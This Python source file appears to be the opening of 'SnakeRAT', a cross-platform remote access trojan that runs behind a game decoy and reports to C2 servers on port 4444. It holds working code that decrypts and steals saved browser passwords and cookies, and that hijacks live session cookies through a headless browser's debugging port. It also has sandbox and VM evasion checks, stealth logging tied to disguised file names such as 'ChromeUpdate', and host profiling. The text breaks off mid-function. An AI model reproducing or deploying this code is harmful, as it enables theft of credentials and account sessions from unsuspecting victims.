#!/usr/bin/env python3
"""
Advanced SnakeRAT - Stealth C2 Client with Game Decoy
Cross-Platform Version (Linux/Windows/macOS)
Version: 3.1 Professional
"""

import pygame
import sys
import socket
import io
import json
import threading
import time
import logging
import argparse
import webbrowser
import os
import base64
import subprocess
import platform
import hashlib
import random
import string
import ctypes
import psutil
import ssl
import gzip
import pickle
import queue
from pathlib import Path
from typing import Dict, List, Any, Union, Optional, Tuple
from dataclasses import dataclass, asdict
from cryptography.fernet import Fernet
import tempfile
import shutil
import getpass
import uuid
try:
    import netifaces
except ImportError:
    pass
import importlib.metadata
from datetime import datetime
import sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519

# Platform-specific imports
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'
IS_MAC = platform.system().lower() == 'darwin'

if IS_WINDOWS:
    try:
        import winreg
        import win32api
        import win32con
        import win32process
        import win32service
        WINDOWS_IMPORTS = True
    except:
        WINDOWS_IMPORTS = False
else:
    WINDOWS_IMPORTS = False

# Default Configuration (can be overridden via command line)
C2_HOST = "127.0.0.1"
C2_PORT = 4444

C2_SERVERS = [
    {"host": C2_HOST, "port": C2_PORT},
    {"host": "192.168.1.100", "port": 4444},
    {"host": "10.0.0.1", "port": 4444}
]

# Stealth Configuration
SLEEP_JITTER = (2, 2)
MAX_RETRIES = 5
ENCRYPTION_KEY = "AdvancedSnakeRAT_2024_CrossPlatform"


class BrowserManager:
    """Handle browser data extraction (passwords, history, cookies)"""
    
    @staticmethod
    def get_passwords():
        """Extract passwords from all supported browsers"""
        all_passwords = []
        all_keys = {}
        
        if IS_WINDOWS:
            browsers = {
                'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
                'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
                'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data'),
                'Opera': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable'),
                'Opera GX': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')
            }
            
            for name, path in browsers.items():
                if os.path.exists(path):
                    res = BrowserManager._steal_chromium_windows(name, path)
                    if isinstance(res, dict):
                        all_passwords.extend(res.get('passwords', []))
                        browser_keys = res.get('keys')
                        if browser_keys:
                            all_keys[name] = browser_keys
        
        elif IS_LINUX:
            browsers = {
                'Chrome': os.path.expanduser('~/.config/google-chrome'),
                'Chromium': os.path.expanduser('~/.config/chromium'),
                'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
                'Opera': os.path.expanduser('~/.config/opera')
            }
            
            for name, path in browsers.items():
                if os.path.exists(path):
                    res = BrowserManager._steal_chromium_linux(name, path)
                    if isinstance(res, dict):
                        all_passwords.extend(res.get('passwords', []))
        
        return {'passwords': all_passwords, 'keys': all_keys}

    @staticmethod
    def get_cookies(url_filter=None):
        """Extract cookies from all supported browsers, optionally filtered by URL/domain"""
        all_cookies = []
        all_keys = [] # Standardized as list of keys
        
        if IS_WINDOWS:
            browsers = {
                'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
                'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
                'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data'),
                'Opera': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable'),
                'Opera GX': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')
            }
            
            for name, path in browsers.items():
                if os.path.exists(path):
                    res = BrowserManager._steal_cookies_windows(name, path, url_filter)
                    if isinstance(res, dict):
                        all_cookies.extend(res.get('cookies', []))
                        browser_keys = res.get('keys', [])
                        if browser_keys:
                            all_keys.extend(browser_keys)
        
        # TODO: Linux cookie support
        
        return {'cookies': all_cookies, 'keys': list(set(all_keys))}

    @staticmethod
    def get_live_cookies(url="https://www.google.com", port=9222, timeout=90):
        """Extract cookies using Remote Debugging Port (bypasses App-Bound encryption)"""
        try:
            import http.client
            import struct
            
            # 1. Multi-Browser Discovery (Find the browser the user ACTUALLY uses)
            best_browser_path = None
            best_profile_path = None
            best_profile_name = "Default"
            max_cookies = -1
            
            # Domain fragment for checking relevance
            domain_frag = url.split("//")[-1].split("/")[0] if "//" in url else url
            domain_frag = ".".join(domain_frag.split(".")[-2:]) # e.g. instagram.com

            if IS_WINDOWS:
                search_targets = [
                    ('Chrome', [
                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\Application\chrome.exe'),
                        os.path.join(os.environ.get('ProgramFiles', ''), r'Google\Chrome\Application\chrome.exe'),
                        os.path.join(os.environ.get('ProgramFiles(x86)', ''), r'Google\Chrome\Application\chrome.exe')
                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data')),
                    
                    ('Edge', [
                        os.path.join(os.environ.get('ProgramFiles(x86)', ''), r'Microsoft\Edge\Application\msedge.exe'),
                        os.path.join(os.environ.get('ProgramFiles', ''), r'Microsoft\Edge\Application\msedge.exe')
                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data')),
                    
                    ('Brave', [
                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\Application\brave.exe'),
                        os.path.join(os.environ.get('ProgramFiles', ''), r'BraveSoftware\Brave-Browser\Application\brave.exe')
                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data')),

                    ('Opera', [
                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Programs\Opera\launcher.exe'),
                        r'C:\Program Files\Opera\launcher.exe'
                    ], os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable')),

                    ('Opera GX', [
                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Programs\Opera GX\launcher.exe'),
                        r'C:\Program Files\Opera GX\launcher.exe'
                    ], os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')),

                    ('Vivaldi', [
                        os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Vivaldi\Application\vivaldi.exe'),
                        os.path.join(os.environ.get('ProgramFiles', ''), r'Vivaldi\Application\vivaldi.exe')
                    ], os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Vivaldi\User Data')),
                ]

                for b_name, b_exe_paths, ud_root in search_targets:
                    found_exe = None
                    for exe_p in b_exe_paths:
                        if os.path.exists(exe_p):
                            found_exe = exe_p
                            break
                    if not found_exe or not os.path.exists(ud_root): continue

                    # Check profiles
                    p_list = []
                    if "Opera" in b_name:
                        p_list = [("", ud_root)]
                    else:
                        try:
                            for d in os.listdir(ud_root):
                                if d == "Default" or d.startswith("Profile "):
                                    p_list.append((d, os.path.join(ud_root, d)))
                        except: pass

                    for p_name, p_path in p_list:
                        c_jar = os.path.join(p_path, "Network", "Cookies")
                        if not os.path.exists(c_jar): c_jar = os.path.join(p_path, "Cookies")
                        
                        if os.path.exists(c_jar):
                            try:
                                temp_chk = os.path.join(tempfile.gettempdir(), f"vld_{random.randint(1000,9999)}.db")
                                shutil.copy2(c_jar, temp_chk)
                                conn = sqlite3.connect(temp_chk)
                                count = conn.execute("SELECT COUNT(*) FROM cookies WHERE host_key LIKE ?", (f"%{domain_frag}%",)).fetchone()[0]
                                conn.close()
                                os.remove(temp_chk)
                                
                                if count > max_cookies:
                                    max_cookies = count
                                    best_browser_path = found_exe
                                    best_profile_path = ud_root
                                    best_profile_name = p_name
                            except: pass

            if not best_browser_path:
                return {'error': 'No suitable browser with active session found for live extraction'}
            
            browser_path = best_browser_path
            profile_path = best_profile_path
            best_profile = best_profile_name
            
            # Shadow Selected Profile
            temp_user_data = os.path.join(tempfile.gettempdir(), f"chrome_shadow_{random.randint(1000, 9999)}")
            os.makedirs(temp_user_data, exist_ok=True)
            
            if profile_path and os.path.exists(profile_path):
                try:
                    # Chrome expects the profile data in a 'Default' subfolder of user-data-dir if we want it used
                    os.makedirs(os.path.join(temp_user_data, "Default"), exist_ok=True)
                    os.makedirs(os.path.join(temp_user_data, "Default", "Network"), exist_ok=True)
                    
                    # Copy Master Key (Local State)
                    src_ls = os.path.join(profile_path, "Local State")
                    if os.path.exists(src_ls):
                        shutil.copy2(src_ls, os.path.join(temp_user_data, "Local State"))
                    
                    # Copy Targeted Profile Cookies as 'Default'
                    src_profile = os.path.join(profile_path, best_profile)
                    for f in ["Cookies"]:
                        for sub in ["", "Network"]:
                            src_c = os.path.join(src_profile, sub, f)
                            if os.path.exists(src_c):
                                dest_sub = os.path.join(temp_user_data, "Default", sub)
                                os.makedirs(dest_sub, exist_ok=True)
                                shutil.copy2(src_c, os.path.join(dest_sub, f))
                except:
                    pass

            cmd = [
                browser_path or "",
                f"--remote-debugging-port={port}",
                f"--user-data-dir={temp_user_data}",
                "--headless=new",
                "--no-first-run",
                "--remote-allow-origins=*",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                url
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cookies = []
            ws_url = ""
            
            # Wait for CDP
            start_time = time.time()
            while time.time() - start_time < 20:
                try:
                    conn = http.client.HTTPConnection("127.0.0.1", port)
                    conn.request("GET", "/json/list")
                    resp = conn.getresponse()
                    if resp.status == 200:
                        targets = json.loads(resp.read().decode())
                        for t in targets:
                            if t.get('type') == 'page' and 'webSocketDebuggerUrl' in t:
                                ws_url = str(t['webSocketDebuggerUrl'])
                                break
                        if ws_url: 
                            break
                    conn.close()
                except:
                    pass
                time.sleep(1)
            
            if ws_url:
                try:
                    path_part = "/" + ws_url.split("/", 3)[3] if "/" in ws_url else ""
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(20)
                    s.connect(("127.0.0.1", port))
                    
                    key = base64.b64encode(os.urandom(16)).decode()
                    handshake = f"GET {path_part} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
                    s.send(handshake.encode())
                    s.recv(4096)
                    
                    # 1. State Verification (Wait for 'complete')
                    for i in range(40):
                        try:
                            pid = 2000 + i
                            cmd_eval = json.dumps({"id": pid, "method": "Runtime.evaluate", "params": {"expression": "document.readyState"}})
                            BrowserManager._send_ws_frame(s, cmd_eval)
                            
                            found = False
                            p_start = time.time()
                            while time.time() - p_start < 2:
                                data = s.recv(16384)
                                if b'"complete"' in data and f'"id":{pid}'.encode() in data:
                                    found = True
                                    break
                            if found: 
                                break
                        except:
                            pass
                        time.sleep(1)
                    
                    # 2. Settling Buffer
                    time.sleep(20)
                    
                    # 3. Enable Network domain
                    cmd_enable = json.dumps({"id": 1, "method": "Network.enable"})
                    BrowserManager._send_ws_frame(s, cmd_enable)
                    try: s.recv(4096)
                    except: pass

                    # 4. Navigate to target URL live so Instagram/FB actually sets sessionid
                    #    This is the critical step – headless browser won't have session cookies
                    #    unless it actually visits the authenticated page.
                    try:
                        cmd_nav = json.dumps({"id": 3, "method": "Page.navigate", "params": {"url": url}})
                        BrowserManager._send_ws_frame(s, cmd_nav)
                        # Drain – wait up to 15s for Page.loadEventFired or timeout
                        nav_start = time.time()
                        nav_buf = b""
                        while time.time() - nav_start < 15:
                            try:
                                chunk = s.recv(32768)
                                if chunk:
                                    nav_buf += chunk
                                    if b'loadEventFired' in nav_buf or b'Page.frameStoppedLoading' in nav_buf:
                                        break
                            except: break
                        time.sleep(3)  # settle after nav
                    except: pass

                    # 5. Targeted getCookies for the specific domain (captures sessionid reliably)
                    domain_frag_live = url.split("//")[-1].split("/")[0] if "//" in url else url
                    domain_variants = [domain_frag_live, f".{domain_frag_live}"]
                    for dv in domain_variants:
                        try:
                            cmd_targeted = json.dumps({"id": 4, "method": "Network.getCookies", "params": {"urls": [url]}})
                            BrowserManager._send_ws_frame(s, cmd_targeted)
                            t_buf = b""
                            t_start = time.time()
                            while time.time() - t_start < 10:
                                chunk = s.recv(131072)
                                if not chunk: break
                                t_buf += chunk
                                if b'"id":4' in t_buf and b'"result"' in t_buf:
                                    if t_buf.count(b'{') <= t_buf.count(b'}') + 5:
                                        break
                            idx4 = t_buf.find(b'{"id":4')
                            if idx4 != -1:
                                r4 = json.loads(t_buf[idx4:].decode(errors='replace'))
                                targeted_cookies = r4.get('result', {}).get('cookies', [])
                                if targeted_cookies:
                                    # Merge targeted into main cookies (priority: targeted wins)
                                    existing_keys = {(c.get('name'), c.get('domain')) for c in cookies}
                                    for tc in targeted_cookies:
                                        k = (tc.get('name'), tc.get('domain'))
                                        if k not in existing_keys:
                                            cookies.append(tc)
                                            existing_keys.add(k)
                        except: pass

                    # 6. Pull all cookies (broad harvest)
                    cmd_get = json.dumps({"id": 2, "method": "Network.getAllCookies"})
                    BrowserManager._send_ws_frame(s, cmd_get)
                    
                    resp_data = b""
                    done = False
                    r_start = time.time()
                    while time.time() - r_start < 30:
                        try:
                            chunk = s.recv(131072)
                            if not chunk: 
                                break
                            resp_data += chunk
                            if b'"id":2' in resp_data and b'"result"' in resp_data:
                                if resp_data.count(b'{') == resp_data.count(b'}'):
                                    done = True
                                    break
                        except:
                            break
                    
                    if done:
                        idx = resp_data.find(b'{"id":2')
                        if idx != -1:
                            try:
                                result = json.loads(resp_data[idx:].decode(errors='replace'))
                                all_cookies_raw = result.get('result', {}).get('cookies', [])
                                # Merge: existing targeted cookies take priority
                                existing_keys = {(c.get('name'), c.get('domain')) for c in cookies}
                                for ac in all_cookies_raw:
                                    k = (ac.get('name'), ac.get('domain'))
                                    if k not in existing_keys:
                                        cookies.append(ac)
                                        existing_keys.add(k)
                            except:
                                pass
                    s.close()
                except:
                    pass

            proc.terminate()
            time.sleep(1)
            shutil.rmtree(temp_user_data, ignore_errors=True)
            
            if cookies:
                return {'success': True, 'count': len(cookies), 'cookies': cookies, 'status': 'live'}
            return {'success': False, 'message': 'Live extraction completed but no cookies found.', 'status': 'live_failed'}

        except Exception as e:
            return {'error': str(e)}

    @staticmethod
    def _send_ws_frame(sock, data):
        import struct
        payload = data.encode()
        length = len(payload)
        header = bytearray([0x81])
        if length <= 125:
            header.append(length | 0x80)
        elif length <= 65535:
            header.append(126 | 0x80)
            header.extend(struct.pack(">H", length))
        else:
            header.append(127 | 0x80)
            header.extend(struct.pack(">Q", length))
        mask = os.urandom(4)
        header.extend(mask)
        masked_payload = bytearray()
        for i in range(length):
            masked_payload.append(payload[i] ^ mask[i % 4])
        header.extend(masked_payload)
        sock.send(header)

    @staticmethod
    def _steal_cookies_windows(browser_name, user_data_path, url_filter=None):
        """Steal cookies from Chromium-based browsers on Windows"""
        cookies = []
        try:
            # 1. Get Master Key (reuse same logic as passwords)
            local_state_path = os.path.join(user_data_path, "Local State")
            if not os.path.exists(local_state_path):
                local_state_path = os.path.join(os.path.dirname(user_data_path), "Local State")
                if not os.path.exists(local_state_path): return {'cookies': [], 'keys': {}}

            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            
            local_state_data = local_state.get("os_crypt", {})
            encrypted_key_raw = base64.b64decode(local_state_data.get("encrypted_key", ""))
            app_bound_key_raw = base64.b64decode(local_state_data.get("app_bound_encrypted_key", ""))
            
            # Use DPAPI to decrypt the key
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]

            def decrypt_dpapi(data):
                if not data: return None
                try:
                    if data.startswith(b'DPAPI'): data = data[5:]
                    in_blob = DATA_BLOB(len(data), ctypes.create_string_buffer(data))
                    out_blob = DATA_BLOB()
                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
                        res = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                        ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                        return res
                except: pass
                return None

            potential_keys = []
            m1 = decrypt_dpapi(encrypted_key_raw)
            if m1: potential_keys.append(m1)
            m2 = decrypt_dpapi(app_bound_key_raw)
            if m2: potential_keys.append(m2)
            
            if not potential_keys: return {'cookies': [], 'keys': {}}
            master_key = potential_keys[0]

            # 2. Iterate Profiles
            profiles = ['Default', 'Guest Profile']
            for i in range(1, 10): profiles.append(f'Profile {i}')
            
            for profile in profiles:
                # Cookies path varies in newer versions
                cookie_paths = [
                    os.path.join(user_data_path, profile, "Network", "Cookies"),
                    os.path.join(user_data_path, profile, "Cookies")
                ]
                
                cookie_db = None
                for cp in cookie_paths:
                    if os.path.exists(cp):
                        cookie_db = cp
                        break
                
                if not cookie_db: continue
                
                temp_db = os.path.join(tempfile.gettempdir(), f"ck_{random.randint(1000, 9999)}.db")
                shutil.copy2(cookie_db, temp_db)
                
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    query = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_httponly, is_secure, samesite FROM cookies"
                    params = []
                    if url_filter:
                        query += " WHERE host_key LIKE ?"
                        params.append(f"%{url_filter}%")
                    
                    cursor.execute(query, params)
                    
                    for host, name, val, enc_val, path, expires, is_httponly, is_secure, samesite in cursor.fetchall():
                        dec_val = val
                        raw_hash = ""
                        if enc_val:
                            if hasattr(enc_val, 'tobytes'): enc_val = enc_val.tobytes()
                            raw_hash = enc_val.hex()
                            
                            if not dec_val:
                                if enc_val.startswith(b'v10') or enc_val.startswith(b'v11') or enc_val.startswith(b'v20'):
                                    iv = enc_val[3:15]
                                    payload = enc_val[15:]
                                    
                                    worked = False
                                    for key in potential_keys:
                                        try:
                                            aesgcm = AESGCM(key)
                                            decrypted_bytes = aesgcm.decrypt(iv, payload, None)
                                            dec_val = decrypted_bytes.decode('utf-8', errors='replace')
                                            worked = True
                                            break
                                        except Exception as e:
                                            last_err = str(e)
                                            continue
                                    
                                    if not worked:
                                        # Match password error style for consistency
                                        err_type = "InvalidTag()" if "tag" in last_err.lower() else last_err
                                        payload_len = len(payload)
                                        iv_len = len(iv)
                                        mk_len = len(potential_keys[0]) if potential_keys else 0
                                        dec_val = f"[{err_type} | MK:{mk_len} IV:{iv_len} P:{payload_len}]"
                                else:
                                    raw_dec = decrypt_dpapi(enc_val)
                                    if raw_dec:
                                        dec_val = raw_dec.decode('utf-8', errors='replace')
                                    else:
                                        dec_val = "[DPAPI failed]"

                        # Convert Webkit timestamp (microseconds since 1601) to Unix (seconds since 1970)
                        unix_expires = 0
                        if expires > 0:
                            unix_expires = (expires / 1000000) - 11644473600
                            if unix_expires < 0: unix_expires = 0

                        # Map SameSite
                        ss_map = {-1: "unspecified", 0: "no_restriction", 1: "lax", 2: "strict"}
                        ss_str = ss_map.get(samesite, "unspecified")

                        cookies.append({
                            'browser': browser_name,
                            'profile': profile,
                            'domain': host,
                            'name': name,
                            'value': dec_val,
                            'path': path,
                            'expirationDate': unix_expires,
                            'httpOnly': bool(is_httponly),
                            'secure': bool(is_secure),
                            'sameSite': ss_str,
                            'hostOnly': not host.startswith('.'),
                            'session': expires == 0 or unix_expires == 0,
                            'storeId': "0"
                        })
                    conn.close()
                except: pass
                finally:
                    if os.path.exists(temp_db): os.remove(temp_db)
            
            return {
                'cookies': cookies,
                'keys': [base64.b64encode(k).decode() for k in potential_keys]
            }
        except Exception as e:
            return {'cookies': [], 'keys': {}, 'error': str(e)}

    @staticmethod
    def _steal_chromium_windows(browser_name, user_data_path):
        """Steal passwords from Chromium-based browsers on Windows"""
        passwords = []
        try:
            # 1. Get Master Key
            local_state_path = os.path.join(user_data_path, "Local State")
            if not os.path.exists(local_state_path):
                # Try higher level for Opera
                local_state_path = os.path.join(os.path.dirname(user_data_path), "Local State")
                if not os.path.exists(local_state_path): return {'passwords': [], 'keys': {}}

            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            
            local_state_data = local_state.get("os_crypt", {})
            encrypted_key_raw = base64.b64decode(local_state_data.get("encrypted_key", ""))
            app_bound_key_raw = base64.b64decode(local_state_data.get("app_bound_encrypted_key", ""))
            
            # Use DPAPI to decrypt the key
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]

            def decrypt_dpapi(data):
                if not data: return None
                try:
                    # Remove 'DPAPI' prefix (5 bytes) if present
                    if data.startswith(b'DPAPI'): data = data[5:]
                    in_blob = DATA_BLOB(len(data), ctypes.create_string_buffer(data))
                    out_blob = DATA_BLOB()
                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
                        res = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                        ctypes.windll.kernel32.LocalFree(out_blob.pbData)
                        return res
                except: pass
                return None

            potential_keys = []
            m1 = decrypt_dpapi(encrypted_key_raw)
            if m1: potential_keys.append(m1)
            m2 = decrypt_dpapi(app_bound_key_raw)
            if m2: potential_keys.append(m2)
            
            if not potential_keys: return {'passwords': [], 'keys': {}}
            master_key = potential_keys[0] # Primary key for reporting backward compatibility

            # 2. Iterate Profiles
            profiles = ['Default', 'Guest Profile']
            for i in range(1, 10): profiles.append(f'Profile {i}')
            
            for profile in profiles:
                login_db = os.path.join(user_data_path, profile, "Login Data")
                if not os.path.exists(login_db): continue
                
                # Copy to temp to avoid 'locked' errors
                temp_db = os.path.join(tempfile.gettempdir(), f"sq_{random.randint(1000, 9999)}.db")
                shutil.copy2(login_db, temp_db)
                
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for url, user, enc_pass in cursor.fetchall():
                        if not user or not enc_pass: continue
                        
                        # Ensure enc_pass is bytes
                        if hasattr(enc_pass, 'tobytes'): # Handle memoryview
                            enc_pass = enc_pass.tobytes()
                        elif not isinstance(enc_pass, bytes):
                            enc_pass = bytes(enc_pass)

                        dec_pass = ""
                        try:
                            # Detect encryption version (v10, v11, and newer v20)
                            if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11') or enc_pass.startswith(b'v20'):
                                if not master_key:
                                    dec_pass = "[No Master Key]"
                                else:
                                    iv = enc_pass[3:15]
                                    payload = enc_pass[15:]
                                    dec_pass = None
                                    for idx, key in enumerate(potential_keys):
                                        try:
                                            aesgcm = AESGCM(key)
                                            decrypted_bytes = aesgcm.decrypt(iv, payload, None)
                                            try:
                                                dec_pass = decrypted_bytes.decode('utf-8')
                                            except:
                                                dec_pass = decrypted_bytes.decode('latin-1', errors='replace')
                                            break # Success
                                        except Exception as ae:
                                            last_err = ae
                                            continue
                                    
                                    if dec_pass is None:
                                        m_len = len(potential_keys[0]) if potential_keys else 0
                                        dec_pass = f"[{repr(last_err)} | Keys:{len(potential_keys)} IV:{len(iv)} P:{len(payload)}]"
                            else:
                                try:
                                    raw_dec = decrypt_dpapi(enc_pass)
                                    if raw_dec:
                                        try:
                                            dec_pass = raw_dec.decode('utf-8')
                                        except:
                                            dec_pass = raw_dec.decode('latin-1', errors='replace')
                                    else:
                                        prefix = enc_pass[:4].hex() if enc_pass else "empty"
                                        dec_pass = f"[DPAPI failed: {prefix}]"
                                except Exception as de:
                                    dec_pass = f"[DPAPI Error: {repr(de)}]"
                        except Exception as e:
                            dec_pass = f"[General Error: {repr(e)}]"
                        
                        passwords.append({
                            'browser': browser_name,
                            'profile': profile,
                            'url': url,
                            'user': user,
                            'pass': dec_pass,
                            'hash': enc_pass.hex() if (dec_pass and dec_pass.startswith("[")) else None
                        })
                    conn.close()
                except:
                    pass
                finally:
                    if os.path.exists(temp_db): os.remove(temp_db)
            
            return {
                'passwords': passwords,
                'keys': [base64.b64encode(k).decode() for k in potential_keys]
            }
        except Exception as e:
            return {'passwords': [], 'keys': {}, 'error': str(e)}

    @staticmethod
    def _steal_chromium_linux(browser_name, user_data_path):
        """Steal passwords from Chromium-based browsers on Linux (simplified)"""
        passwords = []
        # Linux decryption requires interacting with secret service/keyring
        # For now, we collect the database for manual offline extraction or basic dump
        try:
            profiles = ['Default']
            for i in range(1, 10): profiles.append(f'Profile {i}')
            
            for profile in profiles:
                login_db = os.path.join(user_data_path, profile, "Login Data")
                if not os.path.exists(login_db): continue
                
                temp_db = os.path.join(tempfile.gettempdir(), f"sq_l_{random.randint(1000, 9999)}.db")
                shutil.copy2(login_db, temp_db)
                
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for url, user, enc_pass in cursor.fetchall():
                        if not user: continue
                        passwords.append({
                            'browser': browser_name,
                            'profile': profile,
                            'url': url,
                            'user': user,
                            'pass': '[ENCRYPTED_LINUX]',
                            'hash': enc_pass.hex() if isinstance(enc_pass, bytes) else str(enc_pass)
                        })
                    conn.close()
                except: pass
                finally:
                    if os.path.exists(temp_db): os.remove(temp_db)
            return {'passwords': passwords}
        except Exception as e:
            return {'passwords': [], 'error': str(e)}

class CryptoManager:
    """Handle encryption/decryption of C2 communications"""
    
    def __init__(self, key=ENCRYPTION_KEY, is_raw=False):
        if is_raw:
            # If key is raw, it should already be a URL-safe base64 encoded bytes string
            # suitable for Fernet. If it's a string, encode it.
            self.key = key if isinstance(key, bytes) else key.encode()
        else:
            # If not raw, it's a passphrase. Hash it and then base64 encode the hash.
            # Ensure the passphrase is bytes before hashing.
            passphrase_bytes = key if isinstance(key, bytes) else key.encode()
            self.key = base64.urlsafe_b64encode(hashlib.sha256(passphrase_bytes).digest())
        self.fernet = Fernet(self.key)
    
    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, data):
        return self.fernet.decrypt(data)

class Logger:
    """Stealthy log system for the client"""
    
    def __init__(self, log_file=None, debug=True):
        self.debug_mode = debug
        # Don't log to file if it's a shadow instance to stay stealthy
        self.log_file = log_file if not any(x in os.path.abspath(__file__) for x in [".dbus-service", "ChromeUpdate", ".metadata"]) else None
        
        if self.log_file:
            try:
                logging.basicConfig(
                    filename=self.log_file,
                    level=logging.DEBUG if debug else logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s'
                )
            except: pass

    def _log(self, level, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if self.debug_mode:
            try: print(f"[{timestamp}] [{level}] {message}")
            except: pass
        
        if self.log_file:
            try:
                log_func = getattr(logging, level.lower() if level != 'SUCCESS' else 'info', logging.info)
                log_func(f"[{level}] {message}")
            except: pass

    def info(self, message): self._log('INFO', message)
    def warning(self, message): self._log('WARNING', message)
    def error(self, message): self._log('ERROR', message)
    def success(self, message): self._log('SUCCESS', message)
    def debug(self, message): 
        if self.debug_mode: self._log('DEBUG', message)

class AntiSandbox:
    """Basic checks to detect if running in a VM/Sandbox"""
    @staticmethod
    def is_sandbox():
        """Returns True if a sandbox/VM is detected"""
        try:
            # Check for common VM filenames/modules
            vm_elements = ['vboxguest', 'vboxservice', 'vmtoolsd', 'vmmemctl', 'qemu-ga']
            if IS_WINDOWS:
                # Check for common VM vendor IDs
                o = subprocess.check_output('wmic baseboard get manufacturer', shell=True).decode().lower()
                if any(x in o for x in ['microsoft', 'vmware', 'virtualbox', 'qemu']): return True
            elif IS_LINUX:
                # Check dmesg or modules
                o = subprocess.check_output('lsmod', shell=True).decode().lower()
                if any(x in o for x in vm_elements): return True
                
            # Check cpu count - often 1 in cheap sandboxes
            if psutil.cpu_count() < 2: return True
            
            # Check RAM - often less than 2GB in sandboxes
            if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024: return True
            
            return False
        except: return False

    def _log(self, level, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if self.debug_mode:
            print(f"[{timestamp}] [{level}] {message}")
        
        if self.log_file:
            log_func = getattr(logging, level.lower() if level != 'SUCCESS' else 'info', logging.info)
            log_func(f"[{level}] {message}")

    def info(self, message): self._log('INFO', message)
    def warning(self, message): self._log('WARNING', message)
    def error(self, message): self._log('ERROR', message)
    def success(self, message): self._log('SUCCESS', message)
    def debug(self, message): 
        if self.debug_mode: self._log('DEBUG', message)

class SystemProfiler:
    """Advanced system profiling and information gathering (Cross-platform)"""
    
    @staticmethod
    def get_system_info():
        """Get comprehensive system information"""
        info = {
            "client_id": SystemProfiler.generate_fingerprint(),
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "cpu_count": psutil.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_total": psutil.virtual_memory().total,
            "memory_available": psutil.virtual_memory().available,
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": {},
            "network_interfaces": {},
            "username": getpass.getuser(),
            "pid": os.getpid(),
            "is_admin": PrivilegeManager.is_admin(),
            "boot_time": psutil.boot_time(),
            "python_version": sys.version,
            "current_directory": os.getcwd(),
            "platform": platform.platform(),
            "mac_address": SystemProfiler.get_mac_address(),
            "public_ip": SystemProfiler.get_public_ip(),
            "installed_packages": SystemProfiler.get_installed_packages()
        }
        
        # Get disk usage for all partitions
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info["disk_usage"][partition.device] = {
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": usage.percent,
                    "mountpoint": partition.mountpoint,
